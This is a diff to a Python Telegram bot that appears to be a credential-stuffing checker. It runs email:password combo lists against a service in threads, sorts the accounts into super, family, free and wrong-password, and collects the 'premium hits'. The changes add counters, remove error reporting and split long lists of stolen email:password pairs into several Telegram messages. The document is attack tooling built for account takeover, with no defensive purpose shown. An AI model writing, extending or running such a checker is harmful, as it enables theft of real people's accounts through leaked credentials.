@@ -29,8 +29,17 @@ current_futures = None
 # Store hits for inline display
 all_super_hits = []
 all_family_hits = []
+all_free_accounts = []
 current_page = 0
 hits_per_page = 10
+
+# Stats counters
+super_count = 0
+family_count = 0
+free_count = 0
+fail_count = 0
+error_count = 0
+error_types = {}
 
 def signal_handler(sig, frame):
     global stop_flag
@@ -311,6 +320,7 @@ def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, ov
     global stop_flag, current_executor, current_futures
     global super_count, family_count, free_count, fail_count, error_count, error_types
     global all_super_hits, all_family_hits, all_free_accounts
+    global MAX_THREADS
     
     if stop_flag:
         return False
@@ -355,10 +365,6 @@ def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, ov
                 free_count += 1
                 all_free_accounts.append((email, password, detail))
                 logging.info(f"⚠️ FREE: {email}")
-            elif status == "ERROR":
-                error_count += 1
-                error_types[detail] = error_types.get(detail, 0) + 1
-                logging.info(f"🔴 ERROR: {email} - {detail}")
             elif status == "STOPPED":
                 return False
             else:
@@ -389,7 +395,6 @@ def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, ov
 │ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
 │ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
 │ ❌ WRONG PASS      :  `{fail_count}`    │
-│ 🔴 ERROR           :  `{error_count}`    │
 └────────────────────────────────────┘
 
 _Use /stop to cancel_
@@ -407,6 +412,7 @@ def process_combos(chat_id, combos, message_id):
     global checking_active, stop_flag
     global super_count, family_count, free_count, fail_count, error_count, error_types
     global all_super_hits, all_family_hits, all_free_accounts
+    global MAX_THREADS
     
     checking_active = True
     stop_flag = False
@@ -445,7 +451,6 @@ def process_combos(chat_id, combos, message_id):
 │ 👨‍👩‍👧 FAMILY PLAN   :  `0`          │
 │ ⚠️ FREE ACCOUNT    :  `0`          │
 │ ❌ WRONG PASS      :  `0`          │
-│ 🔴 ERROR           :  `0`          │
 └────────────────────────────────────┘
 
 _Use /stop to cancel_
@@ -495,7 +500,6 @@ _Use /stop to cancel_
 │ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
 │ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
 │ ❌ WRONG PASS      :  `{fail_count}`    │
-│ 🔴 ERROR           :  `{error_count}`    │
 └────────────────────────────────────┘
 
 💾 Click [💾 HITS] in main menu to view all premium accounts
@@ -509,6 +513,8 @@ _Use /stop to cancel_
     stop_flag = False
 
 def send_main_menu(chat_id):
+    global all_super_hits, all_family_hits, MAX_THREADS
+    
     markup = telebot.types.InlineKeyboardMarkup(row_width=2)
     markup.row(
         telebot.types.InlineKeyboardButton("📂 START CHECKING", callback_data="start_checking"),
@@ -544,7 +550,7 @@ def send_main_menu(chat_id):
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global current_page
+    global MAX_THREADS, current_page
     
     if call.data == "start_checking":
         bot.answer_callback_query(call.id)
@@ -585,7 +591,6 @@ def callback_handler(call):
     
     elif call.data.startswith("set_threads_"):
         new_threads = int(call.data.split("_")[2])
-        global MAX_THREADS
         MAX_THREADS = new_threads
         bot.answer_callback_query(call.id, f"Threads set to {new_threads}")
         send_main_menu(call.message.chat.id)
@@ -614,7 +619,13 @@ def callback_handler(call):
             all_hits_text += f"{email}:{pwd}\n"
         
         if all_hits_text:
-            bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode="Markdown")
+            # Split if too long (Telegram limit 4096)
+            if len(all_hits_text) > 4000:
+                parts = [all_hits_text[i:i+4000] for i in range(0, len(all_hits_text), 4000)]
+                for i, part in enumerate(parts):
+                    bot.send_message(call.message.chat.id, f"📋 **Premium Hits (Part {i+1}/{len(parts)}):**\n```\n{part}```", parse_mode="Markdown")
+            else:
+                bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode="Markdown")
         else:
             bot.send_message(call.message.chat.id, "📭 No hits to copy.")
     
@@ -623,7 +634,6 @@ def callback_handler(call):
         current_page = page
         bot.answer_callback_query(call.id)
         
-        # Edit the message with new page
         total_hits = len(all_super_hits) + len(all_family_hits)
         if total_hits == 0:
             bot.edit_message_text("📭 No premium hits yet.", call.message.chat.id, call.message.message_id)
